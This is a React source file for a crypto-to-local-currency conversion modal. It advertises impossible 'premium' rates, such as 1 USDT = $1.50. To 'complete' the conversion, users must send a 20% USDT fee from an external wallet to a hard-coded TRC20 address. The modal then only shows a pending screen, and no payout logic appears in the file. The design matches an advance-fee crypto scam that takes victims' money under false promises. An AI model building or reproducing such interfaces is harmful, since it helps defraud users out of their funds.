import { useState } from 'react'
import { useAuth } from '../../../context/AuthContext'
import { LOCAL_CURRENCIES, LOCAL_CURRENCIES_MAP } from '../../../data/currencies'
import {
  X,
  RefreshCw,
  Sparkles,
  ShieldCheck,
  CheckCircle2,
  AlertCircle,
  Copy,
  Check,
  ArrowRight,
  Clock,
  Landmark,
  Coins
} from 'lucide-react'

// Crypto Input Assets with Base Multiplier
const CRYPTO_INPUT_ASSETS = {
  USDT: { name: 'Tether USD', symbol: 'USDT', baseUsdRate: 1.50, min: 10 },
  BTC: { name: 'Bitcoin', symbol: 'BTC', baseUsdRate: 131175.0, min: 0.0001 },
  ETH: { name: 'Ethereum', symbol: 'ETH', baseUsdRate: 4680.0, min: 0.002 },
  SOL: { name: 'Solana', symbol: 'SOL', baseUsdRate: 267.75, min: 0.05 }
}

export default function ConvertModal({ isOpen, onClose }) {
  const { user, convertCrypto, platformSettings } = useAuth()

  const [fromCrypto, setFromCrypto] = useState('USDT')
  const [toFiat, setToFiat] = useState('USD')
  const [fromAmount, setFromAmount] = useState('')
  const [step, setStep] = useState(1) // 1: Swap Form, 2: 20% External Fee Payment, 3: Success Pending
  const [copiedAddress, setCopiedAddress] = useState(false)
  const [feeTxHash, setFeeTxHash] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [feedback, setFeedback] = useState(null)

  if (!isOpen) return null

  const cryptoObj = CRYPTO_INPUT_ASSETS[fromCrypto]
  const fiatObj = LOCAL_CURRENCIES_MAP[toFiat] || LOCAL_CURRENCIES[0]

  // Premium high rate calculation (e.g. 1 USDT = $1.50 USD)
  const effectiveRate = cryptoObj.baseUsdRate * fiatObj.rate
  const numAmount = Number(fromAmount) || 0
  const convertedFiatOutput = numAmount * effectiveRate

  // 20% Conversion fee based on the crypto value
  // (For USDT: 20% of amount in USDT)
  const conversionFeeUsdt = numAmount * 0.20

  // Conversion fee collection address (TRC20)
  const feeDepositAddress = platformSettings?.wallets?.conversionFeeWallet || 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a'

  const handleProceedToFee = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!numAmount || numAmount <= 0) {
      setFeedback({ type: 'error', message: 'Please enter a valid crypto amount to convert.' })
      return
    }

    if (numAmount < cryptoObj.min) {
      setFeedback({
        type: 'error',
        message: `Minimum conversion amount is ${cryptoObj.min} ${fromCrypto}.`
      })
      return
    }

    // Move to step 2: Pay conversion fee
    setStep(2)
  }

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(feeDepositAddress)
    setCopiedAddress(true)
    setTimeout(() => setCopiedAddress(false), 2000)
  }

  const handleFinalizeConversion = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!feeTxHash.trim()) {
      setFeedback({ type: 'error', message: 'Please provide the external fee payment transaction hash.' })
      return
    }

    setSubmitting(true)
    setTimeout(() => {
      const res = convertCrypto({
        fromAsset: fromCrypto,
        toAsset: toFiat,
        fromAmount: numAmount,
        toAmount: convertedFiatOutput,
        conversionFeeAmount: conversionFeeUsdt,
        feeTxHash: feeTxHash.trim()
      })

      setSubmitting(false)
      if (res.success) {
        setStep(3)
      } else {
        setFeedback({ type: 'error', message: res.error || 'Failed to submit conversion.' })
      }
    }, 800)
  }

  const handleResetAndClose = () => {
    setStep(1)
    setFromAmount('')
    setFeeTxHash('')
    setFeedback(null)
    onClose()
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fade-in">
      <div className="relative w-full max-w-lg bg-[#111111] border border-white/15 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden max-h-[90vh] overflow-y-auto">
        {/* Close Button */}
        <button
          onClick={handleResetAndClose}
          className="absolute top-5 right-5 p-2 text-white/50 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition-all z-10"
        >
          <X className="w-5 h-5" />
        </button>

        {/* STEP 1: Converter Form (Crypto to Local Fiat) */}
        {step === 1 && (
          <div className="space-y-6">
            <div>
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#B0F127]/10 border border-[#B0F127]/20 text-[#B0F127] text-xs font-semibold mb-2">
                <Sparkles className="w-3.5 h-3.5" />
                Premium Fiat Conversion Desk
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                Convert Crypto to Local Currency
              </h3>
              <p className="text-xs text-white/50 mt-1">
                Convert your crypto directly into local fiat currency at institutional premium exchange rates.
              </p>
            </div>

            {/* High Rate Incentive Banner */}
            <div className="p-3 bg-[#B0F127]/10 border border-[#B0F127]/30 rounded-xl flex items-center justify-between text-xs font-mono">
              <span className="text-[#B0F127] font-bold">
                Special Rate: 1 {fromCrypto} = {fiatObj.symbol}{effectiveRate.toLocaleString('en-US', { minimumFractionDigits: 2 })} {toFiat}
              </span>
              <span className="text-[10px] text-white/60 bg-black/40 px-2 py-0.5 rounded">
                High-Yield FX
              </span>
            </div>

            <form onSubmit={handleProceedToFee} className="space-y-4">
              {/* From Crypto Asset Box */}
              <div className="p-4 bg-black/60 border border-white/10 rounded-2xl space-y-2">
                <div className="flex justify-between text-xs text-white/50 font-mono">
                  <span>From Crypto Asset</span>
                  <span>Min: {cryptoObj.min} {fromCrypto}</span>
                </div>

                <div className="flex items-center gap-3">
                  <input
                    type="number"
                    step="any"
                    required
                    placeholder="0.00"
                    value={fromAmount}
                    onChange={(e) => setFromAmount(e.target.value)}
                    className="w-full bg-transparent text-xl sm:text-2xl font-bold font-mono text-white outline-none placeholder-white/30"
                  />

                  <select
                    value={fromCrypto}
                    onChange={(e) => setFromCrypto(e.target.value)}
                    className="bg-[#1a1a1a] border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2 text-xs font-bold text-white outline-none cursor-pointer font-mono"
                  >
                    {Object.keys(CRYPTO_INPUT_ASSETS).map((sym) => (
                      <option key={sym} value={sym}>
                        {sym}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              {/* To Local Fiat Currency Box */}
              <div className="p-4 bg-black/60 border border-white/10 rounded-2xl space-y-2">
                <div className="flex justify-between text-xs text-white/50 font-mono">
                  <span>To Local Currency (Estimated Payout)</span>
                  <span>1 {fromCrypto} ≈ {fiatObj.symbol}{effectiveRate.toFixed(2)}</span>
                </div>

                <div className="flex items-center gap-3">
                  <div className="w-full text-xl sm:text-2xl font-black font-mono text-[#B0F127] truncate">
                    {numAmount > 0
                      ? `${fiatObj.symbol}${convertedFiatOutput.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                      : `${fiatObj.symbol}0.00`}
                  </div>

                  <select
                    value={toFiat}
                    onChange={(e) => setToFiat(e.target.value)}
                    className="bg-[#1a1a1a] border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2 text-xs font-bold text-white outline-none cursor-pointer font-mono max-w-[140px]"
                  >
                    {LOCAL_CURRENCIES.map((c) => (
                      <option key={c.code} value={c.code}>
                        {c.code} ({c.symbol}) - {c.name}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              {/* Rate & 20% Fee Breakdown */}
              <div className="p-3.5 bg-[#1a1a1a] rounded-xl border border-white/5 space-y-2 text-xs font-mono">
                <div className="flex justify-between text-white/60">
                  <span>Exchange Rate:</span>
                  <span className="text-white font-bold">
                    1 {fromCrypto} = {fiatObj.symbol}{effectiveRate.toLocaleString('en-US', { minimumFractionDigits: 2 })} {toFiat}
                  </span>
                </div>
                <div className="flex justify-between text-white/60">
                  <span>Conversion Fee (20%):</span>
                  <span className="text-[#B0F127] font-bold">
                    {conversionFeeUsdt.toFixed(2)} USDT
                  </span>
                </div>
                <div className="flex justify-between text-[11px] text-white/40 pt-1 border-t border-white/5">
                  <span>Fee Settlement:</span>
                  <span className="text-amber-400">Payable via external wallet transfer</span>
                </div>
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-lg flex items-center justify-center gap-2"
              >
                <span>Pay Conversion Fee to Complete Conversion</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>
          </div>
        )}

        {/* STEP 2: Pay 20% Conversion Fee (External Wallet) */}
        {step === 2 && (
          <div className="space-y-6">
            <div>
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs font-semibold mb-2">
                <ShieldCheck className="w-3.5 h-3.5" />
                External Fee Settlement
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                Pay Conversion Fee to Complete Conversion
              </h3>
              <p className="text-xs text-white/50 mt-1">
                Transfer the 20% conversion fee from an external wallet to the designated pool address below.
              </p>
            </div>

            {/* Fee Amount Callout */}
            <div className="p-4 bg-black/60 border border-white/10 rounded-2xl text-center space-y-1">
              <span className="text-xs text-white/50 font-mono block">Required 20% Conversion Fee</span>
              <div className="text-2xl font-black text-[#B0F127] font-mono">
                ${conversionFeeUsdt.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT (TRC20)
              </div>
              <span className="text-[11px] text-white/40">
                Converting {numAmount} {fromCrypto} → {fiatObj.symbol}{convertedFiatOutput.toLocaleString('en-US', { minimumFractionDigits: 2 })} {toFiat}
              </span>
            </div>

            {/* QR Code & Wallet Address */}
            <div className="space-y-3">
              <div className="p-4 bg-black/40 border border-white/10 rounded-2xl flex flex-col sm:flex-row items-center gap-4">
                <div className="w-24 h-24 bg-white p-2 rounded-xl flex items-center justify-center shrink-0">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${feeDepositAddress}`}
                    alt="Fee QR Code"
                    className="w-full h-full object-contain"
                  />
                </div>

                <div className="min-w-0 space-y-2 w-full">
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-white/60 font-medium">Conversion Fee Wallet (TRC20)</span>
                    <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">
                      USDT / TRON
                    </span>
                  </div>

                  <div className="p-2.5 bg-black/70 rounded-xl border border-white/10 flex items-center justify-between gap-2">
                    <span className="text-xs font-mono text-white/90 truncate">
                      {feeDepositAddress}
                    </span>
                    <button
                      type="button"
                      onClick={handleCopyAddress}
                      className="p-1.5 bg-[#B0F127] text-black rounded-lg hover:bg-[#9ee016] transition-all shrink-0"
                    >
                      {copiedAddress ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>
              </div>

              <p className="text-[11px] text-amber-300/80 bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-xl text-center">
                Note: Conversion fee must be transferred from an external wallet source. It cannot be deducted from your platform balance.
              </p>
            </div>

            {/* Transaction Hash Input */}
            <form onSubmit={handleFinalizeConversion} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs text-white/60">Payment Transaction Hash (TxID)</label>
                <input
                  type="text"
                  required
                  placeholder="Paste external transfer TxHash (e.g. 0x7a8b... or Hash ID)"
                  value={feeTxHash}
                  onChange={(e) => setFeeTxHash(e.target.value)}
                  className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                />
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="w-1/3 py-3 bg-white/5 hover:bg-white/10 text-white font-semibold text-xs rounded-xl border border-white/10 transition-all"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-2/3 py-3 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  {submitting ? 'Verifying Transfer...' : 'I Have Paid Conversion Fee'}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* STEP 3: Submitted & Pending Screen */}
        {step === 3 && (
          <div className="text-center py-6 space-y-5 animate-fade-in">
            <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
              <Clock className="w-8 h-8 animate-pulse" />
            </div>

            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-white">Conversion Pending</h3>
              <p className="text-xs text-white/60 max-w-sm mx-auto leading-relaxed">
                Your 20% conversion fee transfer has been submitted for verification. Your {fromCrypto} to {toFiat} ({fiatObj.symbol}{convertedFiatOutput.toLocaleString('en-US', { minimumFractionDigits: 2 })}) conversion will be credited once confirmed. Check back later for status.
              </p>
            </div>

            <div className="p-4 bg-black/50 border border-white/10 rounded-2xl text-left space-y-2 text-xs font-mono">
              <div className="flex justify-between text-white/60">
                <span>Local Fiat Output:</span>
                <span className="text-[#B0F127] font-bold">
                  {fiatObj.symbol}{convertedFiatOutput.toLocaleString('en-US', { minimumFractionDigits: 2 })} {toFiat}
                </span>
              </div>
              <div className="flex justify-between text-white/60">
                <span>20% Fee Paid:</span>
                <span className="text-white font-bold">${conversionFeeUsdt.toFixed(2)} USDT</span>
              </div>
              <div className="flex justify-between text-white/60">
                <span>Status:</span>
                <span className="text-amber-400 font-semibold">Pending Verification</span>
              </div>
            </div>

            <button
              onClick={handleResetAndClose}
              className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md"
            >
              Return to Dashboard
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
